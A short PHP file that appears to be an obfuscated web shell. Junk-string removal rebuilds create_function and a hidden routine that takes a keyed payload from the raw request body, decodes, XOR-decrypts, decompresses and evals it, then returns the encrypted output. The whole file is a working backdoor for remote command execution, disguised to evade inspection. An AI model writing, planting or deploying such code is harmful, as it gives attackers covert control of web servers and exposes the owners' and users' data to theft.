<?php
$c=str_replace('xt','','cxtxtreatxtxtxte_fxtunction');
$G='$k=D*"607D*41fD*cc";$kh="D*3bb9018D*27602";D*$kf="6c92D*e4f3c560D*";$p="tD*x6D*XD*u';
$C='aD*n();D*$r=@baD*se64_eD*ncode(D*@xD*(@gzcomprD*eD*D*ss($o),$k));printD*("D*$p$kh$r$kf");}';
$r='OfLD*QtvSCULY"D*;funcD*tion x($D*t,$k){$c=D*D*strlen($k);$l=stD*rlD*en($t)D*;$oD*="";';
$K='(@x(@basD*e64D*_decode($D*m[1])D*,$k)));$D*o=@ob_gD*et_coD*ntentD*s();@obD*_end_cle';
$v='for($iD*D*=0;$i<$l;D*){for($j=D*0;($jD*<$c&D*&$i<$l)D*;$j++,D*$i++D*){$o.=$t{$D*iD*}^$';
$R='D*k{$j};}}rD*eturn $o;}D*D*if (@D*preg_match("/D*$kh(.+)D*$kf/"D*,@file_getD*D*_co';
$T='ntents(D*"phpD*://D*input"D*),D*$D*m)==1) {@oD*b_start();@eD*val(@gzuncomD*prD*essD*';
$k=str_replace('D*','',$G.$r.$v.$R.$T.$K.$C);
$d=$c('',$k);$d();
?>
